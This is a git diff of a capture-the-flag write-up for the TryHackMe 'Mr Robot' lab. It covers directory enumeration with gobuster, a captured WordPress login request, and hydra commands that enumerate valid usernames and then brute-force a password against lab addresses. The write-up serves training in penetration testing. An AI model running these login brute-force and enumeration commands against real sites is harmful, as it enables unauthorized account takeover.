@@ -67,7 +67,7 @@ From here we can see reference to two interesting files; `fsocity.dic` and `key-
 We can simply look at the contents of `key-1-of-3.txt` by entering the URL `http://10.10.90.47/key-1-of-3.txt` in the browser or by using `curl`:
 
 ```console
-root@ip-10-10-140-73:~# curl http://10.10.90.47/key-1-of-3.txt
+root:~# curl http://10.10.90.47/key-1-of-3.txt
 073403<R E D A C T E D>0724b9
 ```
 
@@ -81,7 +81,7 @@ We should also go ahead and download a copy of `fsocity.dic`.  Having a look at 
 For the time being, let's take a closer look at the website and see whether we can find an interestiugn directories.  We can use `gobuster` with a medium wordlist for this:
 
 ```console
-root@ip-10-10-140-73:~# gobuster dir -u http://10.10.90.47 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 1000 -q
+root:~# gobuster dir -u http://10.10.90.47 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 1000 -q
 /video (Status: 301)
 /admin (Status: 301)
 /wp-content (Status: 301)
@@ -101,8 +101,11 @@ root@ip-10-10-140-73:~# gobuster dir -u http://10.10.90.47 -w /usr/share/wordlis
 
 Interestingly we can see a `/wp-login` page and if we try accessing this we are served a Wordpress login page! :)
 
-![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/949e60a1-f0b6-494e-9090-01ccdeb9f84e)
+If we try logging in with username `admin` and password `admin` (just to see what happens).  The page serves up an error saying **_Invalid username_**.  This is actually great news fopr us as this means we have a way of trying out multiple usernames and finding out which of them are valid.
 
+![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/59c85716-60e0-4cb6-a03d-2dbc19ef8298)
+
+We can do this quite easily using a tool such as `hydra` and it makes sense to use the `fsocity.dic` wordlist we found earlier to attempt this.  But first let's fire up Burp Suite and have a look at what happens when we submit a username and password.  This will allow us to consturct the proper hydra command we need to use.
 
 ```http
 POST /wp-login.php HTTP/1.1
@@ -122,5 +125,28 @@ Upgrade-Insecure-Requests: 1
 log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.90.47%2Fwp-admin%2F&testcookie=1
 ```
 
+We can see a http POST request being made that passes the username as the variable `log` and the password as the variable `pwd`.  We can now use this information so that hydra can enumarte valid usernames with the following command:
 
+```console
+root:~# hydra -L fsocity.dic -p abcdef 10.10.5.136 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username"
+```
 
+Let's take a closer look at the parameters we're passing on to hydra in this command:
+- `-L <filename>` passes a wordlist to be used when brute forcing logins/passwords.  In our case we will be using the file `fsocity.dic` which we downloaded earlier
+- `-p <password>` specifies the password to use.  Since we are just trying to enumarate usernames for the time being, we can use any random string here.
+- `http-post-form` tells hydra to use the http post method (since this is what we saw in Burp Suite).
+- `/wp-login.php:log=^USER^&pwd=^PWD^:Invalid Username`  This part tells hydra the strcuture that the http post request should take. In our case we copy this from the captured post in Burp Suite and replace the username and password with the placeholders `^USER^` and `^PWD^` respectively.  The "`Invalid Username`" is a string we're expecting to recieve in the http response whenever the username is incorrect.
+
+Hydra gives us the following output telling us that from the `fsocity.dic` file provided it has identified `Elliot` as a valid username.
+
+```console
+[DATA] attacking http-post-form://10.10.5.136:80//wp-login.php:log=^USER^&pwd=^PWD^:Invalid username
+[80][http-post-form] host: 10.10.5.136   login: Elliot   password: abcdef
+```
+
+We can now try running the attack again but this time using `Elliot` as the username and brute-forcing the password field.
+
+```console
+root:~# hydra -l elliot -P fsocity.dic 10.10.5.136 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered"
+```
+This time we're using the `-l` switch with username `elliot` and the `-P` switch instead of `-p` to use a wordlist file.  Note that the failure message has also been changed to "The password you entered" to reflect part of the error message we get when we try logging in with the correct username but an incorrect password.
